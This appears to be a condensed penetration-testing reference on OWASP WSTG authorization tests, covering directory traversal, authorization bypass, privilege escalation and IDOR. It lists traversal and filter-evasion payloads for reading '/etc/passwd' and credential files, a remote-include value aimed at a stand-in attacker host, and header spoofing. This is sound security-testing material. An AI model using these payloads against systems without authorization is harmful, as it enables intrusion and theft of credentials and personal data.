# 4.5 Authorization Testing (WSTG-ATHZ)

Source: WSTG v4.2 §4.5. What authenticated (or unauthenticated) users may reach: file-system boundaries, role boundaries, and object boundaries. Two accounts at each privilege level are the core toolkit.

## Test list

- **WSTG-ATHZ-01 — Directory traversal / file include.** Objective: escape the web root via user input reaching file operations. Procedure: **stage 1 — enumerate input vectors**: params used for file ops (`?file=`, `?item=`, `?home=`), unusual extensions, cookies driving templates (`PSTYLE=GreenDotRed`). **Stage 2 — test techniques**: classic `../../../../etc/passwd` (match OS — `boot.ini`/`win.ini` on Windows); encoding rotation (`..%2f`, `%2e%2e%2f`, `..%c0%af`, `%00` null-byte to strip forced extensions, double encoding); absolute paths; external inclusion `?file=http://attacker/x` (also RFI/SSRF); `file:///etc/passwd`; probing internal services `?file=http://localhost:8080`; same-dir self-read `?home=main.cgi` to dump source. Interpretation: any file content returned outside web root = traversal; encoding usually beats naive filters — iterate.
- **WSTG-ATHZ-02 — Bypassing authorization schema.** Objective: reach functions/resources outside your privilege. Procedure: for every request ask — accessible unauthenticated? after logout? as a different role? **Horizontal test**: two same-role accounts A and B; replay each of A's requests with B's session — swapped session token, same `username`/object params; vulnerable if B's response contains A's data or succeeds on A's resources. **Vertical test**: capture an admin's functional requests (or derive paths from docs/source), replay with low-priv session; also flip role claims in requests/cookies/hidden fields. Interpretation: identical response across sessions = broken object-level authz; log which parameter carried the authorization decision.
- **WSTG-ATHZ-03 — Privilege escalation.** Objective: manipulate values the app trusts for privilege decisions. Procedure: catalog points where role/group/permission context is set — then tamper: **group manipulation** (`groupID=grp001` → other groups, `orderID` sequences); **profile/hidden-field manipulation** (`<input name="profile" value="SysAdmin">` — replay modified); **condition-value manipulation** (status params like `PVValid=-1` → `0` to flip error conditions); **IP-based trust** (`X-Forwarded-For` spoofing to beat IP-locked admin or rate limits); **URL traversal** to pages missing the authz check. Interpretation: server trusting client-supplied privilege context = escalation; verify by actually exercising the gained function.
- **WSTG-ATHZ-04 — Insecure Direct Object Reference (IDOR).** Objective: access objects via user-controlled references without authz. Procedure: map every spot user input becomes an object key — DB rows (`?id=1234`, `account=`), files (`?file=report.pdf`), composite keys, GUIDs; then vary the reference (increment, decrement, swap to another user's known ID) under both sessions; test both read and write/delete paths; try encoded/hashed references (still predictable if sequential). Interpretation: another user's data returned = IDOR/BOLA; GUIDs don't fix missing authz, they just slow enumeration.

## Common findings

`../../../../etc/passwd` or `%2e%2e` variants in download/view handlers; `user_id`/`doc_id`/`order_id` incrementable across users; hidden `role`/`profile`/`groupID` parameters honored server-side; admin paths reachable with a logged-in low-priv cookie; `X-Forwarded-For` spoof defeating IP allowlists.

## Escalation notes

Traversal → config files (`web.config`, `.env`, `wp-config.php`) → DB creds → deeper compromise; source disclosure → gray-box review (finds ATHN-04-style logic bugs). Horizontal authz bugs mass-expose PII (report with your own two accounts only). Vertical escalation + CONF-05 admin panels = full control. IDOR on write paths (role change, email change) beats read-only leaks for impact.
